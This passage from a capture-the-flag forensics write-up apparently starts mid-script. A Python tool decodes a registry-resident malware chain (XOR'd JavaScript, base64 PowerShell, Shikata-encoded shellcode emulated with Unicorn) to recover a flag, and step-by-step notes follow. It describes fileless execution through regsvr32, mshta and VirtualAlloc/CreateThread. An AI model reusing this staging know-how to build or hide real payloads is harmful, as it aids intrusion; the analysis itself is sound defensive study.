<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">base64</span><span class="p">.</span><span class="nx">b64decode</span><span class="p">(</span><span class="nx">m</span><span class="p">.</span><span class="nx">group</span><span class="p">(</span><span class="mf">1</span><span class="p">))</span>

<span class="nx">def</span><span class="w"> </span><span class="nx">extract_sc32</span><span class="p">(</span><span class="nx">ps_blob</span><span class="o">:</span><span class="w"> </span><span class="nx">bytes</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">bytes</span><span class="o">:</span>
<span class="w">    </span><span class="nx">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">re</span><span class="p">.</span><span class="nx">search</span><span class="p">(</span><span class="nx">rb</span><span class="s2">"\$sc32\s*=\s*(.+?);\s*\n\s*#qzxth"</span><span class="p">,</span><span class="w"> </span><span class="nx">ps_blob</span><span class="p">,</span><span class="w"> </span><span class="nx">flags</span><span class="o">=</span><span class="nx">re</span><span class="p">.</span><span class="nx">S</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">m</span><span class="o">:</span>
<span class="w">        </span><span class="nx">raise</span><span class="w"> </span><span class="nx">ValueError</span><span class="p">(</span><span class="s2">"Could not locate $sc32 byte array in decoded PowerShell."</span><span class="p">)</span>
<span class="w">    </span><span class="nx">nums</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="kr">int</span><span class="p">(</span><span class="nx">tok</span><span class="p">,</span><span class="w"> </span><span class="mf">16</span><span class="p">)</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nx">tok</span><span class="p">.</span><span class="nx">startswith</span><span class="p">(</span><span class="nx">b</span><span class="s2">"0x"</span><span class="p">)</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="kr">int</span><span class="p">(</span><span class="nx">tok</span><span class="p">)</span>
<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="nx">tok</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">re</span><span class="p">.</span><span class="nx">findall</span><span class="p">(</span><span class="nx">rb</span><span class="s2">"0x[0-9a-fA-F]+|\d+"</span><span class="p">,</span><span class="w"> </span><span class="nx">m</span><span class="p">.</span><span class="nx">group</span><span class="p">(</span><span class="mf">1</span><span class="p">))</span>
<span class="w">    </span><span class="p">]</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">bytes</span><span class="p">(</span><span class="nx">nums</span><span class="p">)</span>

<span class="nx">def</span><span class="w"> </span><span class="nx">decode_shikata_stage</span><span class="p">(</span><span class="nx">sc_blob</span><span class="o">:</span><span class="w"> </span><span class="nx">bytes</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">bytes</span><span class="o">:</span>
<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">This</span><span class="w"> </span><span class="nx">stage</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">x86</span><span class="w"> </span><span class="nx">shellcode</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">self</span><span class="o">-</span><span class="nx">decodes</span><span class="w"> </span><span class="ow">in</span><span class="o">-</span><span class="nx">place</span><span class="p">.</span>
<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">We</span><span class="w"> </span><span class="nx">emulate</span><span class="w"> </span><span class="nx">just</span><span class="w"> </span><span class="kr">long</span><span class="w"> </span><span class="nx">enough</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">decoder</span><span class="w"> </span><span class="nx">loop</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">complete</span><span class="p">.</span>
<span class="w">    </span><span class="kr">from</span><span class="w"> </span><span class="nx">unicorn</span><span class="w"> </span><span class="k">import</span><span class="w"> </span><span class="nx">Uc</span><span class="p">,</span><span class="w"> </span><span class="nx">UC_ARCH_X86</span><span class="p">,</span><span class="w"> </span><span class="nx">UC_MODE_32</span><span class="p">,</span><span class="w"> </span><span class="nx">UC_HOOK_CODE</span><span class="w">  </span><span class="err">#</span><span class="w"> </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="nx">ignore</span>
<span class="w">    </span><span class="kr">from</span><span class="w"> </span><span class="nx">unicorn</span><span class="p">.</span><span class="nx">x86_const</span><span class="w"> </span><span class="k">import</span><span class="w"> </span><span class="nx">UC_X86_REG_ECX</span><span class="p">,</span><span class="w"> </span><span class="nx">UC_X86_REG_EIP</span><span class="p">,</span><span class="w"> </span><span class="nx">UC_X86_REG_ESP</span><span class="w">  </span><span class="err">#</span><span class="w"> </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="nx">ignore</span>

<span class="w">    </span><span class="nx">base</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x01000000</span>
<span class="w">    </span><span class="nx">stack</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x02000000</span>

<span class="w">    </span><span class="nx">uc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Uc</span><span class="p">(</span><span class="nx">UC_ARCH_X86</span><span class="p">,</span><span class="w"> </span><span class="nx">UC_MODE_32</span><span class="p">)</span>
<span class="w">    </span><span class="nx">uc</span><span class="p">.</span><span class="nx">mem_map</span><span class="p">(</span><span class="nx">base</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2000</span><span class="p">)</span>
<span class="w">    </span><span class="nx">uc</span><span class="p">.</span><span class="nx">mem_write</span><span class="p">(</span><span class="nx">base</span><span class="p">,</span><span class="w"> </span><span class="nx">sc_blob</span><span class="p">)</span>
<span class="w">    </span><span class="nx">uc</span><span class="p">.</span><span class="nx">mem_map</span><span class="p">(</span><span class="nx">stack</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2000</span><span class="p">)</span>
<span class="w">    </span><span class="nx">uc</span><span class="p">.</span><span class="nx">reg_write</span><span class="p">(</span><span class="nx">UC_X86_REG_ESP</span><span class="p">,</span><span class="w"> </span><span class="nx">stack</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">)</span>
<span class="w">    </span><span class="nx">uc</span><span class="p">.</span><span class="nx">reg_write</span><span class="p">(</span><span class="nx">UC_X86_REG_EIP</span><span class="p">,</span><span class="w"> </span><span class="nx">base</span><span class="p">)</span>

<span class="w">    </span><span class="nx">def</span><span class="w"> </span><span class="nx">hook_code</span><span class="p">(</span><span class="nx">emu</span><span class="p">,</span><span class="w"> </span><span class="nx">addr</span><span class="p">,</span><span class="w"> </span><span class="nx">_size</span><span class="p">,</span><span class="w"> </span><span class="nx">_user_data</span><span class="p">)</span><span class="o">:</span>
<span class="w">        </span><span class="err">#</span><span class="w"> </span><span class="nx">Decoder</span><span class="w"> </span><span class="nx">loop</span><span class="w"> </span><span class="nx">exits</span><span class="w"> </span><span class="nx">when</span><span class="w"> </span><span class="nx">execution</span><span class="w"> </span><span class="nx">reaches</span><span class="w"> </span><span class="nx">base</span><span class="o">+</span><span class="mh">0x1b</span><span class="w"> </span><span class="kd">with</span><span class="w"> </span><span class="nx">ECX</span><span class="o">=</span><span class="mf">0.</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">addr</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">base</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x1B</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">emu</span><span class="p">.</span><span class="nx">reg_read</span><span class="p">(</span><span class="nx">UC_X86_REG_ECX</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="o">:</span>
<span class="w">            </span><span class="nx">emu</span><span class="p">.</span><span class="nx">emu_stop</span><span class="p">()</span>

<span class="w">    </span><span class="nx">uc</span><span class="p">.</span><span class="nx">hook_add</span><span class="p">(</span><span class="nx">UC_HOOK_CODE</span><span class="p">,</span><span class="w"> </span><span class="nx">hook_code</span><span class="p">)</span>
<span class="w">    </span><span class="nx">uc</span><span class="p">.</span><span class="nx">emu_start</span><span class="p">(</span><span class="nx">base</span><span class="p">,</span><span class="w"> </span><span class="nx">base</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">len</span><span class="p">(</span><span class="nx">sc_blob</span><span class="p">),</span><span class="w"> </span><span class="nx">count</span><span class="o">=</span><span class="mf">5000</span><span class="p">)</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">bytes</span><span class="p">(</span><span class="nx">uc</span><span class="p">.</span><span class="nx">mem_read</span><span class="p">(</span><span class="nx">base</span><span class="p">,</span><span class="w"> </span><span class="nx">len</span><span class="p">(</span><span class="nx">sc_blob</span><span class="p">)))</span>

<span class="nx">def</span><span class="w"> </span><span class="nx">extract_cmd_blob</span><span class="p">(</span><span class="nx">decoded_sc</span><span class="o">:</span><span class="w"> </span><span class="nx">bytes</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">str</span><span class="o">:</span>
<span class="w">    </span><span class="nx">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">re</span><span class="p">.</span><span class="nx">search</span><span class="p">(</span><span class="nx">rb</span><span class="s2">"cmd /c 'echo ([^']+)'"</span><span class="p">,</span><span class="w"> </span><span class="nx">decoded_sc</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">m</span><span class="o">:</span>
<span class="w">        </span><span class="nx">raise</span><span class="w"> </span><span class="nx">ValueError</span><span class="p">(</span><span class="s2">"Could not find cmd /c 'echo ...' string in decoded shellcode."</span><span class="p">)</span>
<span class="w">    </span><span class="nx">raw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">m</span><span class="p">.</span><span class="nx">group</span><span class="p">(</span><span class="mf">1</span><span class="p">).</span><span class="nx">decode</span><span class="p">(</span><span class="s2">"latin1"</span><span class="p">)</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="s2">""</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">raw</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="s2">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="</span><span class="p">)</span>

<span class="nx">def</span><span class="w"> </span><span class="nx">decode_final_flag</span><span class="p">(</span><span class="nx">blob</span><span class="o">:</span><span class="w"> </span><span class="nx">str</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">tuple</span><span class="p">[</span><span class="nx">bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">str</span><span class="p">,</span><span class="w"> </span><span class="nx">str</span><span class="p">]</span><span class="o">:</span>
<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">Stage</span><span class="w"> </span><span class="mf">1</span><span class="o">:</span><span class="w"> </span><span class="nx">base64</span><span class="w"> </span><span class="nx">decode</span><span class="p">,</span><span class="w"> </span><span class="nx">nibble</span><span class="o">-</span><span class="nx">swap</span><span class="w"> </span><span class="nx">each</span><span class="w"> </span><span class="kr">byte</span><span class="p">,</span><span class="w"> </span><span class="nx">XOR</span><span class="w"> </span><span class="mh">0x1f</span><span class="p">.</span>
<span class="w">    </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bytes</span><span class="p">((((</span><span class="nx">b</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mf">4</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mf">4</span><span class="p">))</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFF</span><span class="p">)</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="mh">0x1F</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">b</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">base64</span><span class="p">.</span><span class="nx">b64decode</span><span class="p">(</span><span class="nx">blob</span><span class="p">))</span>

<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">Stage</span><span class="w"> </span><span class="mf">2</span><span class="o">:</span><span class="w"> </span><span class="nx">extract</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span>
<span class="w">    </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">15</span><span class="o">:</span><span class="mf">47</span><span class="p">].</span><span class="nx">decode</span><span class="p">(</span><span class="s2">"latin1"</span><span class="p">)</span>

<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">Stage</span><span class="w"> </span><span class="mf">3</span><span class="o">:</span><span class="w"> </span><span class="nx">convert</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="kr">final</span><span class="w"> </span><span class="mf">32</span><span class="o">-</span><span class="nx">hex</span><span class="w"> </span><span class="nx">flag</span><span class="p">.</span>
<span class="w">    </span><span class="nx">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[]</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="nx">i</span><span class="p">,</span><span class="w"> </span><span class="nx">ch</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">enumerate</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span><span class="o">:</span>
<span class="w">        </span><span class="nx">v</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ord</span><span class="p">(</span><span class="nx">ch</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xF</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">token</span><span class="p">[</span><span class="nx">i</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">].</span><span class="nx">isalpha</span><span class="p">()</span><span class="o">:</span>
<span class="w">            </span><span class="nx">v</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">v</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">9</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xF</span>
<span class="w">        </span><span class="nx">out</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="nx">format</span><span class="p">(</span><span class="nx">v</span><span class="p">,</span><span class="w"> </span><span class="s2">"x"</span><span class="p">))</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">x</span><span class="p">,</span><span class="w"> </span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="s2">""</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>

<span class="nx">def</span><span class="w"> </span><span class="nx">write_artifact</span><span class="p">(</span><span class="nx">path</span><span class="o">:</span><span class="w"> </span><span class="nx">Path</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="nx">bytes</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">None</span><span class="o">:</span>
<span class="w">    </span><span class="nx">path</span><span class="p">.</span><span class="nx">write_bytes</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
<span class="w">    </span><span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="s2">"[+] Wrote {path} ({len(data)} bytes, sha256={sha256_hex(data)})"</span><span class="p">)</span>

<span class="nx">def</span><span class="w"> </span><span class="nx">main</span><span class="p">()</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">None</span><span class="o">:</span>
<span class="w">    </span><span class="nx">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">argparse</span><span class="p">.</span><span class="nx">ArgumentParser</span><span class="p">(</span><span class="nx">description</span><span class="o">=</span><span class="s2">"Recover challenge flag from orhmkbye registry dump."</span><span class="p">)</span>
<span class="w">    </span><span class="nx">parser</span><span class="p">.</span><span class="nx">add_argument</span><span class="p">(</span>
<span class="w">        </span><span class="s2">"--dump"</span><span class="p">,</span>
<span class="w">        </span><span class="nx">required</span><span class="o">=</span><span class="nx">True</span><span class="p">,</span>
<span class="w">        </span><span class="nx">help</span><span class="o">=</span><span class="s2">"Path to text file produced by: chntpw -e NTUSER.DAT (cat orhmkbye)"</span><span class="p">,</span>
<span class="w">    </span><span class="p">)</span>
<span class="w">    </span><span class="nx">parser</span><span class="p">.</span><span class="nx">add_argument</span><span class="p">(</span>
<span class="w">        </span><span class="s2">"--outdir"</span><span class="p">,</span>
<span class="w">        </span><span class="k">default</span><span class="o">=</span><span class="s2">"./recovered"</span><span class="p">,</span>
<span class="w">        </span><span class="nx">help</span><span class="o">=</span><span class="s2">"Directory to write intermediate artifacts (default: ./recovered)"</span><span class="p">,</span>
<span class="w">    </span><span class="p">)</span>
<span class="w">    </span><span class="nx">args</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">parser</span><span class="p">.</span><span class="nx">parse_args</span><span class="p">()</span>

<span class="w">    </span><span class="nx">dump_path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Path</span><span class="p">(</span><span class="nx">args</span><span class="p">.</span><span class="nx">dump</span><span class="p">)</span>
<span class="w">    </span><span class="nx">outdir</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Path</span><span class="p">(</span><span class="nx">args</span><span class="p">.</span><span class="nx">outdir</span><span class="p">)</span>
<span class="w">    </span><span class="nx">outdir</span><span class="p">.</span><span class="nx">mkdir</span><span class="p">(</span><span class="nx">parents</span><span class="o">=</span><span class="nx">True</span><span class="p">,</span><span class="w"> </span><span class="nx">exist_ok</span><span class="o">=</span><span class="nx">True</span><span class="p">)</span>

<span class="w">    </span><span class="nx">text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dump_path</span><span class="p">.</span><span class="nx">read_text</span><span class="p">(</span><span class="nx">errors</span><span class="o">=</span><span class="s2">"ignore"</span><span class="p">)</span>
<span class="w">    </span><span class="nx">hex_payload</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">parse_orhmkbye_dump</span><span class="p">(</span><span class="nx">text</span><span class="p">)</span>
<span class="w">    </span><span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="s2">"[+] Parsed Jhp39 hex length: {len(hex_payload)} chars"</span><span class="p">)</span>
<span class="w">    </span><span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="s2">"[+] Parsed XOR key length: {len(key)} chars"</span><span class="p">)</span>

<span class="w">    </span><span class="nx">js_blob</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">decode_js</span><span class="p">(</span><span class="nx">hex_payload</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">)</span>
<span class="w">    </span><span class="nx">write_artifact</span><span class="p">(</span><span class="nx">outdir</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s2">"orhmkbye_stage.js"</span><span class="p">,</span><span class="w"> </span><span class="nx">js_blob</span><span class="p">)</span>

<span class="w">    </span><span class="nx">ps_blob</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">extract_ps_from_js</span><span class="p">(</span><span class="nx">js_blob</span><span class="p">)</span>
<span class="w">    </span><span class="nx">write_artifact</span><span class="p">(</span><span class="nx">outdir</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s2">"orhmkbye_stage.ps1"</span><span class="p">,</span><span class="w"> </span><span class="nx">ps_blob</span><span class="p">)</span>

<span class="w">    </span><span class="nx">sc_blob</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">extract_sc32</span><span class="p">(</span><span class="nx">ps_blob</span><span class="p">)</span>
<span class="w">    </span><span class="nx">write_artifact</span><span class="p">(</span><span class="nx">outdir</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s2">"orhmkbye_sc32.bin"</span><span class="p">,</span><span class="w"> </span><span class="nx">sc_blob</span><span class="p">)</span>

<span class="w">    </span><span class="nx">decoded_sc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">decode_shikata_stage</span><span class="p">(</span><span class="nx">sc_blob</span><span class="p">)</span>
<span class="w">    </span><span class="nx">write_artifact</span><span class="p">(</span><span class="nx">outdir</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s2">"orhmkbye_sc32_decoded.bin"</span><span class="p">,</span><span class="w"> </span><span class="nx">decoded_sc</span><span class="p">)</span>

<span class="w">    </span><span class="nx">cmd_blob</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">extract_cmd_blob</span><span class="p">(</span><span class="nx">decoded_sc</span><span class="p">)</span>
<span class="w">    </span><span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="s2">"[+] Extracted cmd blob: {cmd_blob}"</span><span class="p">)</span>

<span class="w">    </span><span class="nx">transformed</span><span class="p">,</span><span class="w"> </span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">flag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">decode_final_flag</span><span class="p">(</span><span class="nx">cmd_blob</span><span class="p">)</span>
<span class="w">    </span><span class="nx">write_artifact</span><span class="p">(</span><span class="nx">outdir</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s2">"flag_transform.bin"</span><span class="p">,</span><span class="w"> </span><span class="nx">transformed</span><span class="p">)</span>
<span class="w">    </span><span class="p">(</span><span class="nx">outdir</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s2">"flag_token.txt"</span><span class="p">).</span><span class="nx">write_text</span><span class="p">(</span><span class="nx">token</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"\n"</span><span class="p">)</span>
<span class="w">    </span><span class="p">(</span><span class="nx">outdir</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s2">"flag.txt"</span><span class="p">).</span><span class="nx">write_text</span><span class="p">(</span><span class="nx">flag</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"\n"</span><span class="p">)</span>

<span class="w">    </span><span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="s2">"[+] Token: {token}"</span><span class="p">)</span>
<span class="w">    </span><span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="s2">"[+] FLAG: {flag}"</span><span class="p">)</span>

<span class="k">if</span><span class="w"> </span><span class="nx">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">"__main__"</span><span class="o">:</span>
<span class="w">    </span><span class="nx">main</span><span class="p">()</span>
</code></pre></div>
<p>Detailed Step-by-Step Flow I Used To get extracted shellcode</p>
<ol>
<li>Identify where flag logic lives.
I started from Sysmon timeline to map execution chain. The key pivot is regsvr32 setting a class open-command that launches mshta and reads registry value HKCU\Software\lirs\orhmkbye. That tells you the challenge/flag path is likely registry-resident JS in orhmkbye, not the large malware PE branch (WmmbDZ) used for network payload.</li>
<li>Dump and analyze orhmkbye from the user hive. I extracted the raw registry value from:
NTUSER.DAT (/C/Users/FlagYard/NTUSER.DAT)</li>
</ol>
<p>The value contains obfuscated JS with:</p>
<ol>
<li>a large hex string variable (Jhp39)</li>
<li>an XOR key variable (BfynX5vgv6j)</li>
<li>a loop that decodes bytes and eval(...) executes them</li>
<li>Decode the JS stage.
In script recover_flag_from_orhmkbye.py(recover_flag_from_orhmkbye.py:28), I parse those two vars, then perform repeating-key XOR against bytes.fromhex(Jhp39).
That recovers clear JS to /tmp/recovered_flag/orhmkbye_stage.js.</li>
<li>Extract and decode embedded PowerShell.
The decoded JS contains FromBase64String('...'), which is parsed in recover_flag_from_orhmkbye.py (recover_flag_from_orhmkbye.py:42).
Decoded PS is written to /tmp/recovered_flag/orhmkbye_stage.ps1.</li>
<li>Extract $sc32 shellcode byte array.
The PS script has inline shellcode [Byte[]] $sc32 = ... and runs it via VirtualAlloc + CreateThread.
I extract this to /tmp/recovered_flag/orhmkbye_sc32.bin.</li>
<li>Decode the Shikata stage correctly.
This shellcode is Shikata-style self-decoding (fnstenv/pop decoder loop pattern).
Instead of hand-decoding fragile offsets, I emulate it with Unicorn in recover_flag_from_orhmkbye.py (/recover_flag_from_orhmkbye.py:60).
I stop emulation exactly after decoder loop completion (base+0x1b with ECX==0) and dump the in-memory decoded
body:
/tmp/recovered_flag/orhmkbye_sc32_decoded.bin.</li>
<li>Pull the command that contains the encoded flag blob.
From decoded shellcode I extract:
cmd /c 'echo VkIEZsYWc6IFlzfnhGZCYpJygmJygqKi0uJ3soeSste30qKyd9Ly0rKnopLSksYg=='</li>
</ol>
<p>This is done in recover_flag_from_orhmkbye.py (/scripts/
recover_flag_from_orhmkbye.py:86).</p>
<ol>
<li>Decode blob to token, then token to final flag.
The final decode logic (implemented in recover_flag_from_orhmkbye.py (recover_flag_from_orhmkbye.py:94)) is:</li>
<li>Base64 decode blob bytes.</li>
<li>For each byte: nibble-swap + XOR 0x1f.</li>
<li>Take byte window [15:47] -&gt; token:
96879875521h4g64bd254h2024e5626s</li>
<li>Convert each char to low nibble (ord(c) &amp; 0xf).</li>
<li>If previous char is alphabetic, add 9 mod 16 to current nibble.</li>
<li>Join as hex.</li>
</ol>
<p>Why This Method Is Reliable</p>
<ol>
<li>It follows observed execution path from forensic artifacts (registry + script chain).</li>
<li>It decodes every real stage in order (registry JS -&gt; PS -&gt; shellcode -&gt; cmd blob).</li>
<li>It avoids false transforms by emulating shellcode decoder exactly.</li>
<li>Final value is algorithmically derived and reproducible from raw evidence each run.</li>
</ol>
<p>Files Used (Input + Generated)</p>
<ol>
<li>Input evidence hive: NTUSER.DAT (/C/Users/FlagYard/NTUSER.DAT)</li>
<li>Optional timeline confirmation: Microsoft-Windows-Sysmon%254Operational.evtx(/C/Windows/System32/winevt/Logs/Microsoft-Windows-Sysmon%254Operational.evtx)</li>
<li>
<p>Dump output from script: orhmkbye_dump.txt</p>
<div class="highlight"><pre><span></span><code><span class="nx">chntpw</span><span class="w"> </span><span class="nx">version</span><span class="w"> </span><span class="mf">1.00</span><span class="w"> </span><span class="mf">140201</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="p">)</span><span class="w"> </span><span class="nx">Petter</span><span class="w"> </span><span class="nx">N</span><span class="w"> </span><span class="nx">Hagen</span>
<span class="nx">Hive</span><span class="w"> </span><span class="o">&lt;</span><span class="p">..</span><span class="o">/</span><span class="nx">C</span><span class="o">/</span><span class="nx">Users</span><span class="o">/</span><span class="nx">FlagYard</span><span class="o">/</span><span class="nx">NTUSER</span><span class="p">.</span><span class="nx">DAT</span><span class="o">&gt;</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="p">(</span><span class="kr">from</span><span class="w"> </span><span class="nx">header</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="p">&lt;</span><span class="nt">yer</span><span class="err">\</span><span class="na">C</span><span class="err">\</span><span class="na">Users</span><span class="err">\</span><span class="na">FlagYard</span><span class="err">\</span><span class="na">NTUSER.DAT</span><span class="p">&gt;</span>
<span class="nx">ROOT</span><span class="w"> </span><span class="nx">KEY</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">offset</span><span class="o">:</span><span class="w"> </span><span class="mh">0x001020</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">Subkey</span><span class="w"> </span><span class="nx">indexing</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">is</span><span class="o">:</span><span class="w"> </span><span class="mf">686</span><span class="nx">c</span><span class="w"> </span><span class="p">&lt;</span><span class="nt">lh</span><span class="p">&gt;</span>
<span class="nx">File</span><span class="w"> </span><span class="nx">size</span><span class="w"> </span><span class="mf">3506176</span><span class="w"> </span><span class="p">[</span><span class="mf">358000</span><span class="p">]</span><span class="w"> </span><span class="nx">bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">containing</span><span class="w"> </span><span class="mf">340</span><span class="w"> </span><span class="nx">pages</span><span class="w"> </span><span class="p">(</span><span class="o">+</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="nx">headerpage</span><span class="p">)</span>
<span class="nx">Used</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="mf">12850</span><span class="o">/</span><span class="mf">3312192</span><span class="w"> </span><span class="nx">blocks</span><span class="o">/</span><span class="nx">bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">unused</span><span class="o">:</span><span class="w"> </span><span class="mf">246</span><span class="o">/</span><span class="mf">179008</span><span class="w"> </span><span class="nx">blocks</span><span class="o">/</span><span class="nx">bytes</span><span class="p">.</span>

